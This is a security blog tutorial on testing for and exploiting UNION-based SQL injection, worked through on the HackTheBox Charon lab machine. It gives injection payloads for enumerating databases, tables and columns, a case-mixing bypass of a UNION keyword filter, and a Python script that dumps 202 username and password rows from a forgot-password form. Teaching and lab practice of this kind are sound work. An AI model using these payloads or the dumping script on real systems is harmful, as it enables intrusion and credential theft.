# SQL Injection 0x02 - Testing and UNION Attacks

## Introduction

This post is the second part of the sql injection series. In this post I've focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I've also covered how you can automate data extraction when the amount of data you are dealing with is a lot.

The post contains two classic UNION injection examples from identification to exploitation of the same. Both the examples are separated into their own parts to ensure that a reader of any experience can follow along. At the end of the post I've put up a small table of new things I've introduced in this post and what they are. I've also put up a checklist of steps that you should perform when testing a parameter and when exploiting UNION-based SQL injections.

## Vulnerability Identification
To be able to identify all the potential SQL injection points, it's essential that the application and its functionality is browsed through and understood (as much as possible), making note of all the pages and functions that might be interacting with the database, usually PHP, ASPX, or such pages. Some of the example of where an application might be interacting with the database would be:
- authentication forms
    - login
    - password reset
- e-commerce platforms
    - product display
- search engine portal

Make note of all the user input fields and parameters being passed in requests. These would be the testing points for SQL injection.

## Vulnerability Testing
Once all the user input fields and parameters have been identified, each field and parameter needs to be tested individually. This is to ensure that only one object is affecting the backend and will make testing for effective. Along with these, HTTP headers like User-Agent and Cookie should also be on your list to test for. User-Agent and/or cookies might be getting tracked and written onto a table for analytics purposes or tracking users.

Best way to test is to use something a SQL database would treat it as a part of the query itself.

``` SQL
'       # a single quote, treated as a string terminator
;       # a semi-colon, treated as a query terminator
#       # a comment, comments out anything that comes after that character in that line
-- -    # a comment, same as above
/**/    # a comment, starts with /* , ends with */ , and can contain anything in between 
AND 1=1 # an and statement, 1=1 tests for true condition. Use 1=2 to test for false conditions
OR 1=1  # an or statement, 1=1 tests for true condition, use 1=2 to test for false condition
sleep(5)# delays the response by the number of seconds mentioned in the sleep command. 
```
The objective of these tests is for the existing query to return true, false or some kinda subtle changes to the webpage or bring out the errors.

### Example 1 - Blog
All examples here are from [HackTheBox - Charon](https://www.hackthebox.eu/home/machines/profile/42) machine.

Normal looking blog post

![Normal Post](/sqli-0x02/1_normal.png)

1. Single-quote - `'`
Add a single quote at the end of the parameter or in an input field.
Eg: http://example.com/blog.php?id=11'

![Single Quote Test](/sqli-0x02/2_single_quote.png)

The post broke due to the semi colon, indicating that the parameter id could potentially be vulnerable to SQL injection

2. Semi-colon - `;`
Add a semi-colon at the end of a parameter or in an input field 
Eg: http://example.com/blog.php?id=11;

![Semi Colon Test](/sqli-0x02/3_semi_colon.png)

This indicates that even though the query may be getting terminated, the query is working just as intended.

3. Comments - `-- -`
Comments passed onto the parameter or the input field needs to be database specific. MySQL uses the above mentioned comments.
Eg: http://example.com/blog.php?id=11--%20-

![Comment Test](/sqli-0x02/4_comments.png)

Even after commenting out the rest of the query, it is working as intended.

4. And operator - `AND`
AND operator should be passed with some additional condition in parameters or input fields.

![AND Operator Test](/sqli-0x02/5_and.png)

This means we can probably append any SQL statement to the `id` parameter. Since a post with id=11 exists and 1=1, it comes out to be true and the post loads. If the same is tried with some random `id` value, while 1=1, the post will not load.

5. OR operator - `OR`
`OR` operator should be passed with some additional condition in parameters or input fields.

![OR Operator Test](/sqli-0x02/6_or.png)

Unlike `AND`, whatever value you put in either the `id` field or the condition after `OR`, as long as one of them is `true` the requested blog post or the first post in the blog will load.

6. Sleep - `sleep(seconds)`
When output doesn't show that something is vulnerable to the SQL injection, doesn't mean that it's not. It could be blind.
At times like those a `sleep` statement could be passed like `id=11 AND sleep(20)` and look at the amount of time it takes to send the response back, if it's anywhere from 18-22 seconds, you have a SQL injection on your hand.

Let's see how long a normal request take

![cURL Request](/sqli-0x02/7_sleep_1.png)

![Time Taken Normally](/sqli-0x02/7_sleep_2.png)

Let's see how long a request with a sleep command of 20 seconds take

![cURL Request With Sleep](/sqli-0x02/7_sleep_3.png)

![Sleep Injection Successful](/sqli-0x02/7_sleep_4.png)

Even with the sleep command we could successfully test that this parameter is vulnerable. Sleep command requires to be used with an operator or a `SELECT` statement, it cannot be used as-is.

## Vulnerability Exploitaion - UNION Attacks - Example 1

Once an SQL injection has been identified and tested, it is time to exploit it. An SQL injection exploitation is usually used in order to find something juicy - credentials, customer details, credit card numbers.

This post, as mentioned above, will cover UNION injections. Let's continue with the above example.

### Backend Query

We've successfully found that the `id` parameter is vulnerable to SQL injection. The way the code might be working at the backend would be that the PHP takes the id parameter from a GET request and then passes it to some internal variable, which puts it into a SQL query. 
If we had to guess the query it is executing it could be something like below:
``` SQL
SELECT title, author, date, post FROM blogpost WHERE id=11
```

With this guess we can estimate that this particular table has 5 columns. Let's test it out.

### Number of Columns

We'll send a set of `UNION` requests to identify number of columns like follows:
```
http://10.10.10.31/singlepost.php?id=11 UNION SELECT 1-- -
```

![UNION Testing](/sqli-0x02/7_union_1.png)

We can rule out that the table does not have just 1 column, and repeat the process by adding another number.

![UNION Worked](/sqli-0x02/8_union_done.png)

After few iterations we found that the table indeed has 5 columns, our estimation was correct.

The above request would've generated a query as follows:
``` SQL
SELECT title, author, date, post FROM blogpost WHERE id=11 UNION SELECT 1,2,3,4,5-- -
```

The reason the first UNION query (sent with only 1 column) did not work is because, a UNION of two tables has to have *equal* number of columns for it to be considered as a working query.

We can send in anything in the `SELECT` part of the `UNION` query since it is not taking anything from a table. We used numbers but you can also send in alphabets; if you do go for alphabets, do not forget to add quotes.

We do not know which column number (from our UNION) is going to which part of the blog post - title, author, date, post.
To do that we can ask the webpage to load a non-existent post (a random `id`), which would result as `false` thus not loading anything, while our `UNION` is present. This will lead to our injected query getting printed out.

![Column Position Found](/sqli-0x02/8_union_ok.png)

*Note*: The number of columns printed out on the screen isn't necessary to be matched by the UNION query, but the number of columns the table actually has. You can see here that only four things are getting printed on here, "1" isn't getting printed out at all.

We can see that fifth column printed out first as title of the post, third and second column as author and date respectively in tiny font, and then the fourth column which has quite some space to put text in as it is used for the post of the blog.

Now that we have column position on hand, we can start dumping data out on the screen.

### Enumerating Database

Let's look at the version of the MySQL database. We can use MySQL internal functions at our advantage here.

![DB Version](/sqli-0x02/11_version.png)

Let's check out the name of the database we're using. In database systems, you can use multiple databases (within a single database management system like MySQL) under different user contexts.

![Database Found](/sqli-0x02/12_blog_union_database.png)

We are using a database called "freeeze"

Let's take a look at the user we are running as.

![User Found](/sqli-0x02/13_blog_union_user.png)

We are running as "freeeze@localhost". Not so useful, let's move on.

### Enumerating Tables

Now we want to know what tables exist in the database we are using.

In SQL we can list down tables and columns that exist in the database. In MySQL, there are a set of tables called as ***information_schema*** tables which holds all the "metadata" or useful information for the database to function properly.

The most commonly used tables of ***information_schema*** set are:
1. *information_schema.tables* - A table containing information about all the tables in the database
2. *information_schema.columns* - A table containing information about all the columns of all the tables in the database

Now that we know that, let's use this information to get information about the tables that are present in our database, "freeeze".

To do so, we'll essentially send in a query as follows:
``` SQL
# Complete query in the backend
SELECT title, author, date, post FROM blogpost WHERE id=11 UNION SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema=database()-- -

# Our malicious query (post UNION)
SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema=database()-- -
```
This will `SELECT` (print out) all the tables `FROM` the table called *information_schema.tables* `WHERE` those tables are in the current `database()`. This of course still need to work along with the existing query and we are assuming that we only have one row to print our output on.

On the above query I'm using a function called `GROUP_CONCAT()`. This function not only concatenates the entire output, it also places it in a single row. You can use this function wherever there is a `LIMIT` on the backend and are restricted to print out multiple rows of output.  

In the form of request it will look like below
``` SQL
http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c)+FROM+information_schema.tables+WHERE+table_schema=database()--+-
```

With group concat, you can pass in hex characters or even additional ascii to provide your results more distinction and even aesthetics.

Output of the above request

![Table Found](/sqli-0x02/15_blog_union_current_db_table.png)

Apparently this particular database only has one table, although we can guess that it's not of any use let's take a look at it anyway.

### Enumerating Columns
We leverage the use of *information_schema.columns* table to get all the columns from the table *blog* we found earlier.

Request sent: 

``` SQL
http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,group_concat(0x7c,column_name,0x7c),5+FROM+information_schema.columns+WHERE+table_name='blog'--+-
```

![Columns Found](/sqli-0x02/16_columns_blog.png)

### Getting Contents
Before printing out everything, let's find out the number of rows present in the table. On the website, it showed only 3 posts, it could be a possibility that there are hidden posts present here.

Let's take a count of `id` column as that column has to be present in a table.

Request sent:
```
http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,4,count(id)+FROM+blog--+-
```

![Number Of Rows](/sqli-0x02/17_row_count.png)

Unfortunately there are only 3 posts present and there is no hidden content available here. Regardless of that, let's print those out.

Printing out id and it's respective texts out on the screen.

Request:
```
http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,group_concat(%27\r\n%27,0x7c,id,0x7c,%27\r\n%27,text),5+FROM+blog--+-
```

![Blog Dump](/sqli-0x02/18_blog_dump.png)

This request will form a query like below:

``` SQL
SELECT title, author, date, text FROM blog WHERE id=191 UNION SELECT 1,2,3,group_concat('\r\n',0x7c,id,0x7c,'\r\n',text),5 FROM blog--+-
```

Unlike before I used the fourth column to print all the entries out at once because printing it out in any other column would not provide much space to fit all that text.

## Example 2 - Forgot Password

In order to avoid breaking the flow of the previous example, I decided to put the second example at the end in which I'll cover testing as well as exploitation.

Unlike the previous example where it was quite obvious that the parameter was vulnerable and was using GET requests, let's take a look at a forgot password functonality which uses a POST request and has some minor filtering in place.

Before moving onto testing a certain functionality it's important to understand that functionality. Let's take a look at how this particular input field can be interacted.

Landing page:

![Password Reset](/sqli-0x02/19_password_reset.png)

By just sending "admin", it prints out an error "Incorrect Format". This is good, getting errors is nice. When special SQL characters are sent with just "admin" leads to the same error.

![Incorrect Format](/sqli-0x02/20_format.png)

By sending "test@test.com" a different error is prompted - "user not found". Ok, great, we can perform user enumeration.

![User Enumeration Possible](/sqli-0x02/21_user_enum.png)

Now that the validation requirement is met, let's try sending special SQL characters like the ones stated above to test it out.

### Vulnerability Testing

I'll be showing the screenshots of BurpSuite Repeater since the data sent in the POST request is not visible on the webpage.

1. Single-quote - `'`
Appending a single-quote to an email address and sending that to the server

![A New Error](/sqli-0x02/22_err_db_req.png)

By sending a single-quote, we are presented with a new error which clearly states that the query caused an error in the database. A good sign.

2. Semi-colon - `;`
Appending a semi-colon to an email address and sending that to the server

![User Not Found](/sqli-0x02/23_semi_colon_test.png)

By sending a semi-colon, a db error wasn't presented but rather a "user not found" error. This indicates that even though the query may be getting terminated, it is working just as intended.

3. Comments - `-- -`
Appending a comment to an email address and sending that to the server

![User Not Found](/sqli-0x02/24_comments.png)

By sending a comment, a db error wasn't presented but rather a "user not found" error. This indicates that even though the rest of the query may be getting terminated, it is working just as intended.

We saw that using a single-quote we were presented with an error, probably so because an extra quote was present in the query. What if a quote and a comment is appended to the email?

![User Not Found](/sqli-0x02/24_quote_comment.png)

We can say that we have successfully injected single-quote and a comment in the query.

4. AND operator
When a string is passed onto a query, you always have to end it with a single-quote since you're appending additional SQL parameters.

To perform an `AND` test here, we add a single-quote which the PHP would have done for ourselves since it's a string. Then we add the AND operator and put our conditions in single-quotes to except the last one which we'll let the PHP code add for us.

![User Not Found](/sqli-0x02/25_and.png)

Although 1=1 is `true`, the earlier part of the condition is false and so we got the `false` result, and so this test also printed out the same error.

5. OR operator
Similar to the previous test, we send a request replacing "AND" with "OR"

![User Not Found](/sqli-0x02/26_or.png)

Surprinsingly this printed the same error instead of saying that it found a user. This was surprising because we were able to inject single-quotes into the query.

6. Sleep
We'll append a `sleep` command along with an `AND` and an `OR`operator and wait for those many seconds to get the response back.
The request I sent for testing was:
```
email=test%40test.com'+AND+sleep(5);--+-
```
And similar for *OR* but unfortunately the responses were received right away.

So far we know that we were successfully able to inject a single-quote and a comment. Let's build a little on that to see if we could actually inject and gain something useful out of it.

#### Number Of Columns
This process as such comes under the enumeration part of the exploitation of SQL injection, but it can also act as a sure indicator that we actually can perform injections. If we can enumerate number of columns present in this table we can go further.

Unlike last time, let's use another method to get the number of columns - `ORDER BY`.
In `UNION`, you are presented with an error till the number of columns in the table and the columns in your SELECT statement are not equal, you combine two tables into one.
In `ORDER BY`, you get an error when the number of columns in your "order by" clause is more than the number of columns in the table, you sort the output of the entire query as per a column.
Just like UNION, ORDER BY can also work on the basis of index of the column and you need not know the column names beforehand. 

Each table that exists, has to have atleast two columns, one is "id", another could be anything. This table could potentially have four columns. One is id, for login it requires username and password, and for reset it requires email. But let's start from column one anyway.

Request sent:
```
email=test%40test.com'+ORDER+BY+1;--+-
```

![Ordered By Column 1](/sqli-0x02/27_orderby_1.png)

Ok, it has one column, let's check if it has more. We'll append a number and then repeat the earlier request till we get some sort of error.

![ORDER BY Column Error](/sqli-0x02/27_orderby_2.png)

As we repeat the process, we encounter an error when we try to sort the output of the table as per column #5. This indicates that we actually do have an injectable parameter which we can proceed with, and also that the table has only four columns to work with.

### Vulnerability Exploitation - UNION Attacks

#### Backend Query

Since this functionality is taking in email address and checking if the username is found, let's estimate a query that the backend PHP code is using

``` SQL
SELECT username FROM users WHERE email = 'user_input';
```

#### Number of Columns
Our next step would have been to find the number of columns which we already did earlier (using `ORDER BY`), finding four columns, but we did not determine which column number is printable, so let's do that.

To find a printable column, we'll need to use a `UNION` clause. We can send the same request as the ORDER BY clause, replacing "ORDER BY" with "UNION SELECT"

Request sent:
```
email=test%40test.com'+UNION+SELECT+1,2,3,4;--+-
```

![UNION Error](/sqli-0x02/28_union_1.png)

A high possibility that "UNION" is blocked, as that is often seen as "hacking attempt" while usage of "SELECT" looks benign.

In order to bypass that we could try using mixed-case UNION - "UnIoN"

Request sent:
```
email=test%40test.com'+UnIoN+SELECT+1,2,3,4;--+-
```

![Blocklist Bypassed](/sqli-0x02/28_union_2.png)

The error changed, it seems that one of columns from the UNION clause is trying to get printed, but it requires it to be as per the email validation. Let's test which column is of email by sending "a@b.com" in place of the numbers one at a time.

Setting first column as an "email" 

![Incorrect Format](/sqli-0x02/28_union_3.png)

We'll repeat this, and soon find out that the fourth column is that of email

![Found The Right Column](/sqli-0x02/28_union_4.png)

Not only did we meet the email requirement of our new SELECT statement, but also found the column which is printable!

### Enumerating Database
Printing out information in this would a little tricky as we have to maintain the email format to meet the validation requirement.

Let's start by printing out the name of the database we are using.

Request sent:
```
test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT(database(),"@b.com");--+-
```

Output:

![Database](/sqli-0x02/29_db_1.png)

The database we are using is "supercms".

Although we can read the output, it does not look very accessible as it is appended to the email part of our concatenation. It is doable, but we can do better.

Request sent:
```
test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT("\r\n",database(),"\r\n","@b.com");--+-
```

Output:

![Database Better](/sqli-0x02/29_db_2.png)

Printing all our information out on a new line looks much better.

Let's take a look at the user we are running as:

![DB User](/sqli-0x02/30_db_user.png)

We are running as "supercms@localhost". Not so useful, let's move on.

### Enumerating Tables

Let's take a count of the tables that exist in the current database we're using.

Request:
```
test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n',count(table_name),'\r\n','@test.com') FROM information_schema.tables WHERE table_schema=database()-- -
```


![Counting Tables](/sqli-0x02/31_count_tables.png)

We see that we have three tables in this database, let's list them out.

Request:

```
test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,table_name,0x7c,'\r\n'),'\r\n','@test.com') FROM information_schema.tables WHERE table_schema=database()-- -
```

![Tables List](/sqli-0x02/32_list_tables.png)

From the output above we can see that we have three tables. Let's see what columns each table has

### Enumerating Columns

Let's look at the columns of the first table - groups

Request:
```
test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x7c,'\r\n'),'\r\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'groups'--+-
```

![Columns Of Table Groups](/sqli-0x02/33_col1.png)

Let's look at the columns of the second table - license

Request:
```
test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x7c,'\r\n'),'\r\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'license'--+-
```

![Columns Of Table Groups](/sqli-0x02/33_col2.png)


Let's look at the columns of the third table - operators

Request:
```
test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x7c,'\r\n'),'\r\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'operators'--+-
```

![Columns Of Table Groups](/sqli-0x02/33_col3.png)

Out of all the table we enumerated for columns, the "operators" table seems to have the most interesting columns - username and password.

Another way that you could enumerate for "interesting" columns without doing table name or column name enumeration is by using wildcards. You could ask the database to return any column that has a keyword in it, like "user". A query to do so would look like this:

``` SQL
SELECT GROUP_CONCAT(column_name,0x3a,table_name,'\r\n') FROM information_schema.columns WHERE column_name like %user%;
```

In MySQL, a wildcard in a query uses "%". This would print out any column name which has the term "user" in it (with anything in front or after the term) and its' respective table name. Similar could be done for password - "%pass%" 

The same with our example can be achieved as follows:

Request:

```
test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x3a,table_name,0x7c,'\r\n'),'\r\n','@test.com') FROM information_schema.columns WHERE column_name like '%user%'-- -
```

Output:

![Getting "username" Column With Wildcard](/sqli-0x02/33_col4.png)

Since we used a wildcard, we get the results from any column that has user in it, but it does get things done quicker.

### Getting Content

Before we dive into dumping information out, it's always a good idea take a count of things. With that said, let's take a count of id of the operators table before we start dumping everything.

Request:
```
test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',count(id),'\r\n','\r\n','%40test.com')+FROM+operators--+-
```

![Row Count](/sqli-0x02/34_row_count.png)

Dumping 202 entries on the screen would not have been good idea, and there would also be a high chance of not every entry getting printed about on the screen.

Let's fetch one entry on the screen, and we'll use that as the basis of our script which will fetch everything for us.

Request:
```
test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',__username_,0x3a,__password_,'\r\n','\r\n','%40test.com')+FROM+operators+LIMIT+0,1--+-
```

![First Row Fetched](/sqli-0x02/35_row1.png)

A test account in the first row is odd, and although there's a shortcut here, I'll cover that once we develop a script to fetch all the accounts.

I've created a python script that will cycle through all the (202) accounts present here and print out the response on the terminal. This requires additional filtering as it does not print out only the credentials, which is what we care about.
``` py
import requests


def injection(a):
    return "test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n','\r\n','cred:',__username_,0x3a,__password_,'\r\n','\r\n','@test.com') FROM operators LIMIT %s,1-- -" % a


for i in range(0,202):
    payload = {'email':injection(i)}
    r = requests.post('http://10.10.10.31/cmsdata/forgot.php', data=payload)
    print r.text
```

Explanation of the script:
1. In the first time, I imported the requests module of python to perform automated requests
2. In the fourth line, I defined an injection function which only returns an injection payload as per the for loop, and changes the OFFSET of the payload with "LIMIT 1". This allows us to cycle through the table and print out only one entry per request.
    1. I've also added a constant string "cred:" in the injection payload which will print as a prefix to every credential dumped for processing purposes.
3. In the tenth line, a for loop is created to cycle through all the accounts present in the database.
4. In the eleventh line, email payload is set to be sent in the POST request
5. In the twelfth line, a request is sent to the required host along with necessary data which we defined above. All of that requests data is assigned to a variable to do further processing on it.
6. In the last line we are printing out the response on the terminal

To ensure that the script is running we first send only one request (keeping range(0,1)), and check the response.

![Test Response OK](/sqli-0x02/35_row_auto2.png)

Response comes exactly as expected, but it requires processing. We can use `grep` and `cut` commands to get the useful output.

Command used:
```
python sqli_charon.py | grep "cred:" | cut -d":" -f2,3
```

Output:

Perfect, let's get them all and save them in a file

![Saved Credentials](/sqli-0x02/35_row_auto4.png)

As shown above, we were able to get all the credentials that was present in the operators table.

This is not the only way to automate this process, and I'd like to encourage you to come up with different ways to do the same.

The shortcut way to do this would again be using wildcards. Since we know that there are test accounts are present in this table to waste our time, we could ask the database to get the count of rows which does not have a username with "test" in it.

Query:
``` SQL
SELECT 1,2,3,CONCAT('\r\n',count(id),'\r\n','@test.com') FROM operators WHERE __username_ NOT like 'test%'-- -
```

Request:

```
test%40abcd.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n',count(id),'\r\n','%40test.com')+FROM+operators+WHERE+__username_+NOT+like+'test%25'--+-
```

![Real Accounts Count](/sqli-0x02/36_real1.png)

Out of 202 rows in the table, 200 were fake accounts, with just two useful accounts.

As a sidenote, if you'd like to crack hashes you got via some SQL injection or some another way, it is a good idea to first try to crack them online. It not only saves you time but also resources.
